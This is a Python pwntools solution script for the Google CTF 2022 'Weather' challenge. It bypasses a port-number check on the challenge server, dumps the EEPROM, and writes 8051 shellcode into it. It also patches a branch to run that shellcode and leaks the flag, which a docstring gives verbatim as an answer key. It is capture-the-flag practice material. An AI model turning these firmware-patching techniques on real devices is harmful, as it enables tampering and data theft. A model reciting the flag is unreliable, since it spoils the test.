#!/usr/bin/env python3
from pwn import *
from pathlib import Path

PROMPT_MESSAGE = """Google CTF 2022 / Weather - solution by "The Maccabees"
What do you want to do?
1) Find EEPROM port
2) Read entire EEPROM
3) Leak the flag
"""

BASE_PORT_BYPASS = 1010176
EEPROM_PORT_BYPASS = 1010209
NUMBER_OF_EEPROM_PAGES = 64
EEPROM_PATCHED_BRANCH = 0x000000F9
EEPROM_SHELLCODE_ADDR = 0x0A02
FLAG_LENGTH = 36
FLAG_LEAK_SIZE = 6

leak_flag_byte_shellcode = [
    0x75, 0xEE, 0x00,    # Write immediate (to 0xEE - flag offset)
    0xAF, 0xEF,          # Read byte from 0xEF (flag raed byte) into R7
    0xEF,                # mov A, R7
    0xF5, 0xF2,          # Write A to address (as serial output)
]

patched_code_at_F9 = [
    0x00,                # NOP
    0x12, 0x0A, 0x02     # Branch to 0x0A02
]


def connect_to_server():
    return remote("weather.2022.ctfcompetition.com", 1337)


def find_eeprom_port(p):
    print("Start iterating over ports..")
    for port in range(128):
        p.recvuntil("? ")
        p.sendline(f"r {BASE_PORT_BYPASS + port} 1")
        resp = p.recvuntil("-end")
        if b"error - device not found" not in resp:
            if port in [101, 108, 110, 111, 119]:
                print(f"Found port {port} (which is standard and known).")
            else:
                print(f"Found unknown port {port}. Maybe EEPROM?")
    print("Finished iterating ports")
    p.close()


def read_all_eeprom(p):
    eeprom_bytes = b''

    print("Starting reading entire EEPROMM..")
    resp = p.recvuntil("? ")
    for page_index in range(NUMBER_OF_EEPROM_PAGES):
        print(f"Reading page: {page_index} / {NUMBER_OF_EEPROM_PAGES}")
        p.sendline(f"w {EEPROM_PORT_BYPASS} 1 {page_index}")
        resp = p.recvuntil("? ")
        p.sendline(f"r {EEPROM_PORT_BYPASS} 64")
        resp = p.recvuntil("? ")
        
        start_index = resp.find(b"ready\n")
        end_index = resp.find(b"-end")
        response_bytes = resp[start_index + len(b"ready\n"):end_index]
        response_numbers_list = response_bytes.replace(b"\n", b" ").decode()
        for eeprom_byte_number in response_numbers_list.split(" "):
            if not eeprom_byte_number:
                continue
            eeprom_bytes += int(eeprom_byte_number).to_bytes(1, "little")

    print("Finished reading EEPROM! Writing to 'eeprom.bin'")
    Path("eeprom.bin").write_bytes(eeprom_bytes)


def send_eeprom_write_packet(p, target_address, bytes_to_write):
    if target_address // 64 != (target_address + len(bytes_to_write)) // 64:
        raise ValueError("Write packet crosses page boundary")

    # Prepare the write packet
    # (As documented in the PDF we got)
    page_index = target_address // 64
    bitmask = [0] * (target_address % 64) + [b ^ 0xff for b in bytes_to_write]
    bitmask += [0] * (64 - len(bitmask))
    packet = [page_index, 0xa5, 0x5a, 0xa5, 0x5a] + bitmask
    packet_str = " ".join(str(p) for p in packet)
    
    # Send the write packet
    p.recvuntil("? ")
    p.sendline(f"w {EEPROM_PORT_BYPASS} {len(packet)} {packet_str}")


def patch_branch(p):
    # Patch the branch (from 0xF9 to 0x0A02)
    send_eeprom_write_packet(p, EEPROM_PATCHED_BRANCH, patched_code_at_F9)


def patch_eeprom(p, start_index):
    # Create 6 instances of the shellcode
    # Each one of them will leak 1 byte of the flag
    final_shellcode = leak_flag_byte_shellcode * FLAG_LEAK_SIZE
    for i in range(0, FLAG_LEAK_SIZE):
        # The byte in offset 2 is the immediate which is the flag offset
        final_shellcode[i * len(leak_flag_byte_shellcode) + 2] = start_index + i

    send_eeprom_write_packet(p, EEPROM_SHELLCODE_ADDR, final_shellcode)


def trigger_unknown_device_read(p):
    # This triggers the flow that we patch (at 0xF9) to branch to our shellcode
    p.recvuntil("? ")
    p.sendline(f"r {BASE_PORT_BYPASS} 1")


def leak_entire_flag():
    """
    Flag is: "CTF{DoesAnyoneEvenReadFlagsAnymore?}"
    """
    flag = b''

    # We read 6-bytes of the flag in each iteration
    print("Starting to leak flag (please wait..)")
    for flag_offset in range(0, FLAG_LENGTH, FLAG_LEAK_SIZE):
        p = connect_to_server()
        patch_eeprom(p, flag_offset)
        patch_branch(p)
        trigger_unknown_device_read(p)
        flag += p.recvn(FLAG_LEAK_SIZE)
        p.close()

    # Print flag
    print(f"Flag: '{flag}'")


def main():
    choice = input(PROMPT_MESSAGE)
    if choice.startswith("1"):
        find_eeprom_port(connect_to_server())
    elif choice.startswith("2"):
        read_all_eeprom(connect_to_server())
    elif choice.startswith("3"):
        leak_entire_flag()
    print("Bye!")


if __name__ == "__main__":
    main()
